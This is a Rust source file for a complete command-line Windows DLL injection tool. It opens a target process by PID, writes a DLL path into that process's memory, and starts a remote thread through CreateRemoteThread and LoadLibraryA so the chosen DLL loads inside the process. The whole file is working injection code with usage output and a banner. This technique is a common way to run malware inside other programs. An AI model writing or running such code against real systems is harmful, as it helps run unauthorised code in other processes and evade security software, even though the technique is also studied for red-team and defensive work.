extern crate winapi;

use winapi::{
    shared::{
        basetsd::SIZE_T, 
        minwindef::DWORD
    },
    um::{
        synchapi::WaitForSingleObject,
        errhandlingapi::GetLastError, 
        handleapi::CloseHandle, 
        libloaderapi::{
            GetModuleHandleA, 
            GetProcAddress
        }, 
        memoryapi::{
            VirtualAllocEx, 
            WriteProcessMemory
        }, 
        minwinbase::LPTHREAD_START_ROUTINE,
        winbase::INFINITE, 
        processthreadsapi::{
            OpenProcess, 
            CreateRemoteThread
        }, 
        winnt::{
            MEM_COMMIT, 
            MEM_RESERVE, 
            PAGE_READWRITE, 
            PROCESS_ALL_ACCESS
        }
    }
};
use std::{
    env, 
    ffi::CString, 
    ptr::null_mut as NULL, 
    mem::transmute, 
    process::exit, 
    path::Path
};


/*-----[Macros]-----*/
macro_rules! okay{ ($($arg:tt)*) => { println!("[+] {}", format_args!($($arg)*))}}
macro_rules! info{ ($($arg:tt)*) => { println!("[!] {}", format_args!($($arg)*))}}
macro_rules! warn{ ($($arg:tt)*) => { println!("[-] {}", format_args!($($arg)*))}}
macro_rules! isnull {
    ($handle:expr, $name:expr) => {
        if $handle == NULL() {
            warn!("Failed to get handle to the {}, error: {} (0x{:X})", $name, GetLastError(), GetLastError());
            exit(1);
        }
    };
}

fn injection(pid: u32, dllpath: String) -> u8 {
    unsafe {
        let mut tid: DWORD = 0;

        // /*-----[DLL path]-----*/
        // let dllpath = CString::new(r"C:\\0xans\\Dev\\Rust\\fuckdll\\target\\x86_64-pc-windows-gnu\\release\\fuckdll.dll").unwrap();
        
        /*-----[Open the target process with RWX]-----*/
        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        isnull!(hprocess, "process");
        okay!("Process opened successfully");

        /*-----[Allocate memory in the target process for the path]-----*/
        let buffer = VirtualAllocEx(hprocess, NULL(), dllpath.as_bytes().len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        isnull!(buffer, "Allocated memory space");
        okay!("Allocated memory, address: {:p}, size: {}", buffer, dllpath.as_bytes().len());

        /*-----[Write the path in the allocated memory]-----*/
        let mut space: SIZE_T = 0;
        let wmem = WriteProcessMemory(hprocess, buffer, dllpath.as_bytes().as_ptr() as *const _, dllpath.as_bytes().len(), &mut space as *mut SIZE_T);
        
        if wmem == 0 || space != dllpath.as_bytes().len() {
            warn!("Failed to write the full DLL path to process memory. Error: {} (0x{:X})", GetLastError(), GetLastError());
            CloseHandle(hprocess);
            exit(1);
        }
        okay!("Successfully wrote DLL path to memory");

        /*-----[Get handle to -> kernal32.dll]-----*/
        let kernelmodname = CString::new("kernel32.dll").unwrap(); 
        let kernel32 = GetModuleHandleA(kernelmodname.as_ptr());
        isnull!(kernel32, "Kernel module");
        
        /*-----[Get LoadLibraryA function address from kernal32.dll]-----*/
        let loadlibrary = CString::new("LoadLibraryA").unwrap();
        let startpoint = GetProcAddress(kernel32, loadlibrary.as_ptr());
        isnull!(startpoint, "LoadLibraryA");

        /*-----[Cast LoadLibraryA address to a start routine thread]-----*/
        let startroute: LPTHREAD_START_ROUTINE = transmute(startpoint);

        /*-----[Remote thread in the process to call LoadLibraryA and load the DLL]-----*/
        let hthread = CreateRemoteThread(hprocess, NULL(), 0, Some(startroute).expect("Some Resone"), buffer, 0, &mut tid);
        if  hthread.is_null() {
            warn!("Failed to get a handle to the new thread, error: {}", GetLastError());
            CloseHandle(hprocess);
            exit(1)
        }
        okay!("Successfully got handle to TID: ({}) - {:?}", tid, hprocess);
        /*-----[Wait to finish execution]-----*/
        info!("Waiting for thread to execute");
        WaitForSingleObject(hthread, INFINITE);
        info!("Thread finished executing, cleaning up");

        /*-----[Close the handles]-----*/
        CloseHandle(hthread);
        CloseHandle(hprocess);
        okay!("Process handle closed");
        
        return 1;
    }
}

fn banner() {
    let banner = r#"
   ___  __   __      ____       _         __  _         
  / _ \/ /  / / ____/  _/__    (_)__ ____/ /_(_)__  ___ 
 / // / /__/ /_/___// // _ \  / / -_) __/ __/ / _ \/ _ \
/____/____/____/  /___/_//_/_/ /\__/\__/\__/_/\___/_//_/
                          |___/  @0xans                                            
    "#;
    println!("{}", banner)
}


fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 5 {
        info!("Usage: {} -p <PID> -d <DLL_path>", Path::new(&args[0]).file_name().unwrap().to_str().unwrap());
        exit(1);
    }

    let mut pid: Option<u32> = None;
    let mut dll_file: Option<String> = None;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-p" => {
                pid = Some(args[i + 1].parse::<u32>().unwrap_or_else(|_| {
                    warn!("Error: PID must be a valid integer.");
                    exit(1);
                }));
                i += 2;
            },
            "-d" => {
                dll_file = Some(args[i + 1].clone());
                i += 2;
            },
            _ => {
                warn!("Error: Unrecognized argument.");
                exit(1);
            }
        }
    }


    if pid.is_none() || dll_file.is_none() {
        warn!("Error: Both -p (PID) and -d (DLL file path) arguments are required");
        exit(1);
    }

    let pid = pid.unwrap();
    let dll_file = dll_file.unwrap();

    banner();

    match injection(pid, dll_file) {
        1 => okay!("DLL Injected successfully"),
        0 => warn!("Error injecting the DLL"),
        _ => warn!("Unexpected error"),
    };
}

